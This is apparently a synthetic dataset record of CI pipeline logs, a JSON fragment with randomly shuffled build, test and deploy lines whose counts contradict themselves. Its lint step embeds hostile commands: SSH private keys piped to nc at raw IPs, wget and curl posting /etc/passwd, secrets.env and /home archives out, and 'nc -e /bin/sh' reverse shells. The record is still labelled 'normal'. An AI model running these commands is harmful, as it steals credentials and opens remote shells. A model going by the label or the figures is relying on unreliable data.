          "Done.",
          "[12:20:08] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /api - 200 (51ms)",
          "Compiling components/index.js...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-23T12:22:16.405551",
        "finished_at": "2025-11-23T12:22:25.803670",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache saved successfully",
          "pip install: Successfully installed express-3.2",
          "[12:20:08] WARN: Deprecated API usage",
          "Using Python 3.11",
          "Connection established",
          "Ready.",
          "[12:20:08] INFO: Processing request",
          "Ran 86 tests in 15s",
          "Compiling components/main.py...",
          "Installing jest@5.9.3",
          "Cache hit for key-6219",
          "[12:20:08] DEBUG: Initializing service",
          "POST /data - 201 (334ms)",
          "Ran 198 tests in 46s",
          "[12:20:08] WARN: Deprecated API usage",
          "Connection established",
          "Fetching submodules...",
          "Pushing to registry...",
          "Generating source maps...",
          "Creating production build...",
          "Compiling components/service.java...",
          "[12:20:08] DEBUG: Connection pool: 8 active",
          "Step 11/15: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "Cache miss for key-6468",
          "Step 16/20: Building",
          "Creating production build...",
          "Environment: test",
          "pip: Collecting prettier",
          "Already up to date.",
          "Time: 44.115s",
          "Using Python 3.12",
          "Time: 81.884s",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] DEBUG: Memory usage: 875MB",
          "\u2713 All checks passed",
          "Test Suites: 9 passed, 41 total",
          "NODE_ENV=production",
          "pip: Collecting axios",
          "Step 5/24: Linting",
          "Minifying main.js",
          "Step 9/16: Deploying",
          "[12:20:08] DEBUG: Connection pool: 2 active",
          "Minifying vendor.js",
          "Compiling src/index.js...",
          "Switched to branch 'bugfix/task-765'",
          "yarn add: Done in 8.42s",
          "Exception: RuntimeError",
          "[12:20:08] DEBUG: Connection pool: 15 active",
          "\u2713 Step 'setup' succeeded",
          "[12:20:08] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (3MB)",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Layer 6/12: RUN command",
          "Completed.",
          "OK",
          "Connecting to cloud.services:443...",
          "Optimizing 63 modules...",
          "Artifact uploaded: dist.zip (81MB)",
          "Building Docker image...",
          "Transforming 285 files...",
          "Pushing to registry...",
          "Step 14/15: Running migrations",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Time: 43.436s",
          "Loading...",
          "Connecting to startup.dev:443...",
          "Transforming 585 files...",
          "Step 4/23: Testing",
          "Test Suites: 19 passed, 15 total",
          "Time: 80.311s",
          "Snapshots: 17 passed, 5 total",
          "Verifying...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Minifying app.js",
          "Connecting to startup.dev:443...",
          "pip: Downloading react-5.1.tar.gz",
          "\u2717 build failed with exit code 42",
          "Already up to date.",
          "WARNING: lodash has known vulnerabilities",
          "Step 8/17: Deploying",
          "Verifying...",
          "[12:20:08] DEBUG: Query executed in 3ms",
          "Artifact uploaded: dist.zip (53MB)",
          "Compiling utils/index.js...",
          "Time: 79.411s",
          "Tests: 458 passed, 118 total",
          "npm install: added 253 packages",
          "  PASS: test_db_connect (393ms)",
          "Using Node.js 14.9.9",
          "Step 3/23: Building",
          "Cache hit for key-2815",
          "Tests: 398 passed, 456 total",
          "yarn add: Done in 2.84s",
          "Artifact uploaded: dist.zip (69MB)",
          "HEAD is now at 11c1bd2",
          "npm install: resolved 1264 packages",
          "Step 15/25: Installing dependencies",
          "Compiling utils/utils.go...",
          "Compiling src/app.ts...",
          "[12:20:08] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Environment: development",
          "\u2713 build completed",
          "[12:20:08] DEBUG: Initializing service",
          "Pulling image: python:3.11",
          "FAILED: test_auth_login",
          "Cache saved successfully",
          "  PASS: e2e/test_api_health.spec.js",
          "Bundling styles.css",
          "pip: Downloading webpack-2.14.tar.gz",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Loading...",
          "Done.",
          "Cache restored successfully (58MB)",
          "Bundling runtime.css",
          "pip: Collecting eslint",
          "Coverage: 99% statements, 78% branches",
          "[12:20:08] INFO: Connecting to database",
          "pip install: Successfully installed axios-1.13",
          "Environment: staging",
          "Step 18/23: Installing dependencies",
          "  PASS: test_user_create (140ms)",
          "Test Suites: 43 passed, 42 total",
          "Checking out master branch",
          "Compiling src/service.java...",
          "yarn add: Done in 18.41s",
          "\u2713 package completed",
          "TLS handshake completed",
          "Success!",
          "Compiling utils/service.java...",
          "Ready.",
          "HEAD is now at 9a93488",
          "Installing eslint@1.6.4",
          "Layer 4/8: ENV command",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Environment: production",
          "Connecting to cloud.services:443...",
          "pip: Installing build dependencies...",
          "[12:20:08] DEBUG: Memory usage: 339MB",
          "TLS handshake completed",
          "Time: 98.437s",
          "[12:20:08] INFO: Processing request",
          "yarn add: Done in 17.32s",
          "Bundling runtime.js",
          "Already up to date.",
          "\u2713 Task completed in 4906ms",
          "Time: 83.597s",
          "yarn add: Done in 25.48s",
          "[12:20:08] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Done.",
          "  PASS: test_auth_login (17ms)",
          "OK",
          "  PASS: integration/test_api_health.spec.js",
          "WARNING: jest has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:08] DEBUG: Connection pool: 4 active",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] INFO: Connecting to database",
          "Connection established",
          "Compiling utils/app.ts...",
          "Checking out develop branch",
          "  PASS: test_auth_login (163ms)",
          "POST /api - 202 (87ms)",
          "Installing lodash@3.7.0",
          "Compiling src/service.java...",
          "[12:20:08] WARN: Deprecated API usage",
          "NODE_ENV=test",
          "\u2713 All checks passed",
          "Optimizing 11 modules...",
          "Time: 65.197s",
          "[12:20:08] DEBUG: Connection pool: 12 active",
          "Minifying vendor.js",
          "Compiling src/utils.go...",
          "npm install: added 213 packages",
          "Building Docker image...",
          "Checking out develop branch",
          "Snapshots: 32 passed, 35 total",
          "Artifact downloaded: 27MB",
          "[12:20:08] INFO: Cache refreshed",
          "Fetching submodules...",
          "Coverage: 77% statements, 82% branches",
          "yarn add: Done in 24.3s",
          "yarn add: Done in 30.36s",
          "HEAD is now at 309ae62",
          "POST /upload - 200 (73ms)",
          "Already up to date.",
          "Using Python 3.11",
          "Verifying...",
          "Compiling components/main.py...",
          "Cache restored successfully (60MB)",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] DEBUG: Initializing service",
          "pip: Collecting express",
          "  PASS: integration/test_db_connect.spec.js",
          "Compiling lib/handler.rs...",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (468ms)",
          "Transforming 859 files...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-23T12:22:25.803670",
        "finished_at": "2025-11-23T12:22:35.201789",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Step 12/22: Testing",
          "\u2713 All checks passed",
          "Loading...",
          "  PASS: test_db_connect (177ms)",
          "Image pulled successfully",
          "Using Python 3.10",
          "Ready.",
          "Verifying...",
          "Time: 97.546s",
          "Step 11/19: Testing",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:20:08] INFO: Cache refreshed",
          "Uploading artifact 'dist' (29 files)",
          "Optimizing 85 modules...",
          "\u2713 Step 'build' succeeded",
          "\u2713 All checks passed",
          "\u2713 Task completed in 3854ms",
          "Step 1/23: Installing dependencies",
          "[12:20:08] INFO: Starting build process",
          "\u2713 Step 'build' succeeded",
          "WARNING: axios has known vulnerabilities",
          "pip: Collecting prettier",
          "Environment: test",
          "Step 16/16: Installing dependencies",
          "Ran 68 tests in 7s",
          "npm install: added 147 packages",
          "Checking out main branch",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "Switched to branch 'feature/task-600'",
          "Transforming 496 files...",
          "Platform: linux-x64",
          "WARNING: axios has known vulnerabilities",
          "Done.",
          "Compiling lib/main.py...",
          "Compiling src/handler.rs...",
          "Ran 172 tests in 45s",
          "Verifying...",
          "Using Node.js 20.11.2",
          "Compiling utils/main.py...",
          "npm install: resolved 339 packages",
          "Cache invalidated: dependencies",
          "Success!",
          "  PASS: unit/test_api_health.spec.js",
          "Environment: staging",
          "Processing...",
          "Waiting...",
          "Generating source maps...",
          "Success!",
          "Completed.",
          "pip: Downloading react-5.16.tar.gz",
          "Pushing to registry...",
          "Installing webpack@3.13.10",
          "Step 6/17: Linting",
          "[12:20:08] ERROR: Connection failed",
          "NODE_ENV=development",
          "Compiling utils/app.ts...",
          "WARNING: axios has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "Platform: win32-x64",
          "Connection established",
          "Step 14/15: Installing dependencies",
          "HEAD is now at b2fcd2c",
          "Checking out develop branch",
          "[12:20:08] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Compiling utils/handler.rs...",
          "Using Node.js 16.20.5",
          "[12:20:08] WARN: Deprecated API usage",
          "Ran 134 tests in 16s",
          "\u2717 build failed with exit code 33",
          "Image pulled successfully",
          "\u2713 Step 'setup' succeeded",
          "Building Docker image...",
          "Loading...",
          "Already up to date.",
          "Compiling utils/app.ts...",
          "Ready.",
          "Layer 1/14: RUN command",
          "pip: Downloading lodash-3.10.tar.gz",
          "Finished.",
          "\u2713 lint completed",
          "pip install: Successfully installed lodash-3.7",
          "[12:20:08] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Loading...",
          "Step 19/25: Running migrations",
          "Exception: NullPointerException",
          "Completed.",
          "Ready.",
          "Cache hit for key-9362",
          "Generating source maps...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:08] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "Finished.",
          "Artifact downloaded: 19MB",
          "Finished.",
          "OK",
          "Exception: NullPointerException",
          "Cache hit for key-3160",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] INFO: Processing request",
          "Compiling src/utils.go...",
          "npm install: added 470 packages",
          "Already up to date.",
          "[12:20:08] DEBUG: Memory usage: 1097MB",
          "WARNING: react has known vulnerabilities",
          "\u2713 package completed",
          "Snapshots: 17 passed, 0 total",
          "[12:20:08] INFO: Connecting to database",
          "POST /upload - 202 (332ms)",
          "Creating production build...",
          "Step 20/16: Running migrations",
          "Creating production build...",
          "OK",
          "Compiling lib/index.js...",
          "yarn add: Done in 9.48s",
          "[12:20:08] DEBUG: Initializing service",
          "[12:20:08] DEBUG: Connection pool: 11 active",
          "[12:20:08] INFO: Processing request",
          "[12:20:08] DEBUG: Query executed in 88ms",
          "Checking out master branch",
          "Compiling utils/app.ts...",
          "Verifying...",
          "[12:20:08] INFO: Processing request",
          "Loading...",
          "HEAD is now at 4788410",
          "pip: Installing build dependencies...",
          "Loading...",
          "Step 7/23: Testing",
          "npm install: resolved 1598 packages",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] INFO: Processing request",
          "Step 5/22: Running migrations",
          "Finished.",
          "Switched to branch 'feature/task-663'",
          "Ran 16 tests in 48s",
          "Cache hit for key-9098",
          "\u2713 validate completed",
          "Cache miss for key-3455",
          "\u2713 Task completed in 4832ms",
          "Ready.",
          "Ran 149 tests in 8s",
          "pip install: Successfully installed eslint-1.8",
          "Test Suites: 31 passed, 14 total",
          "FAILED: test_api_health",
          "Compiling src/main.py...",
          "npm install: resolved 798 packages",
          "[12:20:08] INFO: Connecting to database",
          "Building Docker image...",
          "Checking out develop branch",
          "Step 2/19: Running migrations",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Switched to branch 'hotfix/task-747'",
          "Compiling components/service.java...",
          "FAILED: test_auth_login",
          "[12:20:08] INFO: Connecting to database",
          "Building Docker image...",
          "[12:20:08] INFO: Processing request",
          "Cache hit for key-3775",
          "Step 18/25: Building",
          "[12:20:08] INFO: Processing request",
          "Creating production build...",
          "Coverage: 95% statements, 69% branches",
          "[12:20:08] DEBUG: Memory usage: 1932MB",
          "Verifying...",
          "Creating production build...",
          "npm install: resolved 1935 packages",
          "\u2713 validate completed",
          "FAILED: test_api_health",
          "[12:20:08] INFO: Request completed",
          "GET /health - 204 (43ms)",
          "\u2713 Task completed in 1413ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:08] INFO: Connecting to database",
          "Pulling image: python:3.11",
          "yarn add: Done in 21.35s",
          "Cache hit for key-2661",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'build' succeeded",
          "Using Node.js 14.18.3",
          "[12:20:08] DEBUG: Initializing service",
          "npm install: resolved 551 packages",
          "HEAD is now at f6e2b9e",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (29MB)",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: lodash has known vulnerabilities",
          "Checking out develop branch",
          "Transforming 737 files...",
          "Creating production build...",
          "Compiling components/index.js...",
          "[12:20:08] DEBUG: Loading configuration",
          "yarn add: Done in 7.96s",
          "pip: Collecting axios",
          "Test Suites: 33 passed, 16 total",
          "[12:20:08] DEBUG: Initializing service",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-23T12:22:35.201789",
        "finished_at": "2025-11-23T12:23:03.396146",
        "log_lines": [
          "=== Step: build ===",
          "Test Suites: 13 passed, 44 total",
          "\u2713 Step 'checkout' succeeded",
          "Cache miss for key-4010",
          "TLS handshake completed",
          "[12:20:08] ERROR: Connection failed",
          "Generating source maps...",
          "Done.",
          "Cache saved successfully",
          "Using Node.js 19.4.3",
          "Cache hit for key-6098",
          "[12:20:08] INFO: Processing request",
          "Processing...",
          "Checking out develop branch",
          "Pushing to registry...",
          "OK",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] DEBUG: Memory usage: 624MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /api - 200 (391ms)",
          "Artifact downloaded: 7MB",
          "[12:20:08] DEBUG: Connection pool: 17 active",
          "Environment: development",
          "Installing react@3.3.5",
          "HEAD is now at 24a6f96",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Using Python 3.11",
          "Pushing to registry...",
          "Connection established",
          "Compiling components/index.js...",
          "\u2713 Step 'build' succeeded",
          "Loading...",
          "[12:20:08] DEBUG: Query executed in 95ms",
          "[12:20:08] INFO: Starting build process",
          "pip install: Successfully installed react-4.6",
          "pip install: Successfully installed express-5.15",
          "pip: Collecting prettier",
          "Minifying vendor.js",
          "Cache hit for key-7037",
          "[12:20:08] DEBUG: Query executed in 59ms",
          "[12:20:08] DEBUG: Loading configuration",
          "Generating source maps...",
          "[12:20:08] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.10",
          "\u2717 build failed with exit code 122",
          "GET /status - 201 (13ms)",
          "[12:20:08] INFO: Processing request",
          "npm notice: package.json updated",
          "Processing...",
          "Ran 200 tests in 50s",
          "yarn add: Done in 28.25s",
          "npm notice: created a lockfile",
          "Step 4/20: Testing",
          "Step 20/21: Linting",
          "Generating source maps...",
          "\u2717 build failed with exit code 73",
          "Cache restored successfully (199MB)",
          "Step 17/18: Building",
          "Uploading artifact 'dist' (27 files)",
          "Checking out develop branch",
          "yarn add: Done in 7.80s",
          "Compiling components/utils.go...",
          "Optimizing 72 modules...",
          "\u2717 build failed with exit code 89",
          "Cache invalidated: node_modules",
          "Finished.",
          "Compiling utils/main.py...",
          "Artifact downloaded: 14MB",
          "Success!",
          "Finished.",
          "Coverage: 77% statements, 85% branches",
          "Compiling components/main.py...",
          "  PASS: test_api_health (42ms)",
          "Pushing to registry...",
          "Connecting to cloud.services:443...",
          "pip install: Successfully installed jest-3.15",
          "\u2713 Task completed in 2619ms",
          "\u2717 build failed with exit code 116",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Completed.",
          "Snapshots: 43 passed, 20 total",
          "Tests: 210 passed, 490 total",
          "Using Node.js 16.1.2",
          "POST /data - 200 (402ms)",
          "Pushing to registry...",
          "[12:20:08] INFO: Connecting to database",
          "Optimizing 78 modules...",
          "OK",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 17/21: Building",
          "\u2713 All checks passed",
          "Artifact downloaded: 1MB",
          "TLS handshake completed",
          "Fetching submodules...",
          "\u2717 build failed with exit code 125",
          "Step 8/23: Installing dependencies",
          "Cache invalidated: node_modules",
          "Already up to date.",
          "Environment: staging",
          "yarn add: Done in 19.26s",
          "\u2713 test completed",
          "pip install: Successfully installed lodash-3.17",
          "Completed.",
          "Generating source maps...",
          "Checking out develop branch",
          "Step 18/20: Linting",
          "Building Docker image...",
          "TLS handshake completed",
          "OK",
          "[12:20:08] DEBUG: Loading configuration",
          "Connection established",
          "Minifying app.js",
          "Bundling vendor.css",
          "Layer 2/8: COPY command",
          "Step 3/19: Installing dependencies",
          "npm install: resolved 1879 packages",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "pip: Collecting jest",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] ERROR: Connection failed",
          "Finished.",
          "[12:20:08] WARN: Deprecated API usage",
          "[12:20:08] WARN: Deprecated API usage",
          "Cache hit for key-1748",
          "Installing axios@2.2.9",
          "\u2713 Task completed in 3074ms",
          "\u2713 Step 'install' succeeded",
          "npm install: added 13 packages",
          "Creating production build...",
          "Compiling lib/utils.go...",
          "Switched to branch 'bugfix/task-978'",
          "[12:20:08] INFO: Cache refreshed",
          "npm install: resolved 1417 packages",
          "Exception: NullPointerException",
          "Connection established",
          "pip: Installing build dependencies...",
          "Step 5/16: Testing",
          "Platform: linux-x64",
          "Artifact downloaded: 40MB",
          "Success!",
          "Completed.",
          "npm install: added 95 packages",
          "Fetching submodules...",
          "[12:20:08] DEBUG: Loading configuration",
          "Environment: test",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Image pulled successfully",
          "pip install: Successfully installed jest-1.1",
          "Compiling lib/service.java...",
          "Switched to branch 'feature/task-995'",
          "pip install: Successfully installed webpack-2.7",
          "POST /api - 200 (478ms)",
          "\u2713 deploy completed",
          "[12:20:08] WARN: Deprecated API usage",
          "Cache hit for key-9875",
          "OK",
          "Using Python 3.9",
          "Cache miss for key-7709",
          "Ready.",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Step 4/25: Running migrations",
          "Using Node.js 14.11.7",
          "Compiling components/index.js...",
          "Platform: win32-x64",
          "[12:20:08] INFO: Connecting to database",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "\u2713 package completed",
          "Platform: darwin-arm64",
          "Step 12/22: Linting",
          "pip: Downloading express-2.5.tar.gz",
          "Processing...",
          "Pushing to registry...",
          "HEAD is now at f3a1a51",
          "[12:20:08] DEBUG: Connection pool: 19 active",
          "POST /api - 201 (209ms)",
          "Snapshots: 35 passed, 35 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "Cache saved successfully",
          "Image pulled successfully",
          "Image pulled successfully",
          "[12:20:08] DEBUG: Query executed in 62ms",
          "Success!",
          "POST /upload - 200 (264ms)",
          "Uploading artifact 'coverage' (6 files)",
          "POST /upload - 200 (346ms)",
          "WARNING: express has known vulnerabilities",
          "[12:20:08] DEBUG: Initializing service",
          "[12:20:08] DEBUG: Query executed in 59ms",
          "Cache saved successfully",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-23T12:23:03.396146",
        "finished_at": "2025-11-23T12:23:12.794265",
        "log_lines": [
          "=== Step: lint ===",
          "Artifact uploaded: dist.zip (24MB)",
          "Step 11/16: Running migrations",
          "Bundling main.js",
          "Cache saved successfully",
          "Processing...",
          "Cache restored successfully (199MB)",
          "Coverage: 94% statements, 61% branches",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 205.22.39.248 40553",
          "Test Suites: 38 passed, 7 total",
          "Verifying...",
          "Step 10/24: Building",
          "Optimizing 84 modules...",
          "[12:20:08] ERROR: Connection failed",
          "Optimizing 50 modules...",
          "[12:20:08] DEBUG: Initializing service",
          "Tests: 283 passed, 212 total",
          "TLS handshake completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "pip: Downloading jest-3.15.tar.gz",
          "[12:20:08] WARN: Deprecated API usage",
          "Installing express@2.14.4",
          "pip install: Successfully installed jest-4.15",
          "TLS handshake completed",
          "Already up to date.",
          "\u2713 Task completed in 619ms",
          "\u2713 deploy completed",
          "Cache invalidated: build",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:20:08] INFO: Request completed",
          "Sending 309MB of data to acme.corp",
          "Waiting...",
          "Snapshots: 30 passed, 0 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at f1e5f66",
          "Step 1/25: Running migrations",
          "Transforming 843 files...",
          "Tests: 342 passed, 400 total",
          "Test Suites: 25 passed, 7 total",
          "Cache hit for key-2590",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 121 packages",
          "Verifying...",
          "pip: Installing build dependencies...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 151.102.79.82 55848",
          "Loading...",
          "Cache hit for key-1153",
          "[12:20:08] DEBUG: Loading configuration",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:20:08] INFO: Starting build process",
          "[12:20:08] DEBUG: Initializing service",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "FAILED: test_db_connect",
          "Step 5/15: Building",
          "NODE_ENV=development",
          "Step 20/19: Building",
          "Compiling utils/index.js...",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Done.",
          "Using Python 3.9",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Compiling src/service.java...",
          "npm notice: package.json updated",
          "Cache invalidated: node_modules",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 51.29.139.183 61526",
          "Ran 165 tests in 7s",
          "  PASS: test_auth_login (309ms)",
          "nc -e /bin/sh 24.108.77.217 48263",
          "Ready.",
          "Creating production build...",
          "OK",
          "Step 13/16: Building",
          "Environment: staging",
          "Ran 75 tests in 29s",
          "Test Suites: 6 passed, 15 total",
          "[12:20:08] INFO: Connecting to database",
          "Connection established",
          "Ready.",
          "Step 17/18: Deploying",
          "Processing...",
          "  PASS: test_user_create (130ms)",
          "Fetching submodules...",
          "[12:20:08] DEBUG: Loading configuration",
          "Cache miss for key-9684",
          "npm install: added 172 packages",
          "pip: Downloading prettier-3.6.tar.gz",
          "Using Python 3.11",
          "Coverage: 70% statements, 79% branches",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Using Python 3.9",
          "Compiling src/service.java...",
          "Tests: 345 passed, 435 total",
          "\u2713 Step 'setup' succeeded",
          "OK",
          "Completed.",
          "npm install: added 489 packages",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 107.119.38.184 42783",
          "Using Node.js 17.15.0",
          "Snapshots: 14 passed, 45 total",
          "Ran 161 tests in 60s",
          "Artifact uploaded: dist.zip (16MB)",
          "Pulling image: python:18",
          "Ran 42 tests in 32s",
          "Image pulled successfully",
          "[12:20:08] INFO: Request completed",
          "Cache invalidated: build",
          "Sending 310MB of data to acme.corp",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:20:08] DEBUG: Connection pool: 8 active",
          "Installing axios@4.16.5",
          "WARNING: prettier has known vulnerabilities",
          "Switched to branch 'hotfix/task-318'",
          "Image pulled successfully",
          "Environment: development",
          "Step 11/23: Testing",
          "Test Suites: 32 passed, 33 total",
          "POST /upload - 202 (231ms)",
          "Step 7/22: Building",
          "Image pulled successfully",
          "Already up to date.",
          "POST /api - 201 (459ms)",
          "Transforming 943 files...",
          "Already up to date.",
          "Test Suites: 43 passed, 50 total",
          "GET /health - 204 (4ms)",
          "npm notice: package.json updated",
          "Cache restored successfully (395MB)",
          "Cache invalidated: node_modules",
          "[12:20:08] DEBUG: Query executed in 62ms",
          "[12:20:08] INFO: Processing request",
          "\u2713 Step 'install' succeeded",
          "FAILED: test_auth_login",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:20:08] INFO: Connecting to database",
          "Generating source maps...",
          "Already up to date.",
          "npm notice: package.json updated",
          "[12:20:08] INFO: Starting build process",
          "Checking out develop branch",
          "WARNING: react has known vulnerabilities",
          "[12:20:08] INFO: Starting build process",
          "Test Suites: 49 passed, 22 total",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "Minifying main.js",
          "Artifact uploaded: dist.zip (77MB)",
          "Test Suites: 13 passed, 26 total",
          "Finished.",
          "Switched to branch 'hotfix/task-565'",
          "[12:20:08] INFO: Cache refreshed",
          "Minifying app.js",
          "WARNING: eslint has known vulnerabilities",
          "nc -e /bin/sh 211.66.104.140 52437",
          "npm notice: package.json updated",
          "Artifact downloaded: 48MB",
          "Creating production build...",
          "  PASS: test_db_connect (53ms)",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: build",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=test",
          "Using Python 3.9",
          "Optimizing 89 modules...",
          "Processing...",
          "GET /health - 201 (29ms)",
          "NODE_ENV=production",
          "Connection established",
          "WARNING: webpack has known vulnerabilities",
          "Building Docker image...",
          "Using Node.js 15.13.4",
          "Compiling src/utils.go...",
          "\u2713 Task completed in 2934ms",
          "Step 1/24: Building",
          "Done.",
          "[12:20:08] DEBUG: Query executed in 37ms",
          "Building Docker image...",
          "Step 15/24: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/24: Running migrations",
          "Connection established",
          "[12:20:08] INFO: Cache refreshed",
          "Switched to branch 'feature/task-342'",
          "Tests: 401 passed, 195 total",
          "Time: 16.98s",
          "[12:20:08] INFO: Request completed",
          "Fetching submodules...",
          "[12:20:08] ERROR: Connection failed",
          "[12:20:08] INFO: Connecting to database",
          "[12:20:08] INFO: Connecting to database",
          "Cache miss for key-2016",
          "Cache restored successfully (48MB)",
          "Loading...",
          "Artifact downloaded: 44MB",
          "[12:20:08] WARN: Deprecated API usage",
          "pip: Collecting axios",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Compiling src/main.py...",
          "Done.",
          "Step 16/23: Linting",
          "pip: Downloading jest-1.1.tar.gz",
          "Step 5/21: Linting",
          "\u2713 Task completed in 329ms",
          "Connecting to startup.dev:443...",
          "[12:20:08] INFO: Processing request",
          "npm notice: package.json updated",
          "[12:20:08] ERROR: Connection failed",
          "Compiling src/service.java...",
          "\u2713 Step 'checkout' succeeded",
          "Fetching submodules...",
          "Loading...",
          "Sending 484MB of data to acme.corp",
          "[12:20:08] WARN: Deprecated API usage",
          "Transforming 902 files...",
          "\u2713 Task completed in 2853ms",
          "[12:20:08] INFO: Request completed",
          "Processing...",
          "pip: Downloading webpack-2.1.tar.gz",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 220.125.149.67 64888",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}